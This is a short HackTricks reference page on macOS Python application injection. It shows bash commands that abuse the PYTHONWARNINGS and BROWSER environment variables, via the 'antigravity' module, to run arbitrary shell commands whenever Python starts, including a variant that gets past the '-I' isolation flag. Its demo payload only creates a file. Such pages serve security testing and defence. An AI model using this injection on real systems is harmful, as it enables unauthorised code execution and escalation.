---
source_name: HackTricks
source_url: https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-python-applications-injection
source_date: '2024-01-15'
cve_tags: []
chunk_id: ''
---

# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PYTHONWARNINGS` and `BROWSER` env variables

It's possible to alter both environment variables to execute arbitrary code whenever python is called, for example:

```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

{{#include ../../../banners/hacktricks-training.md}}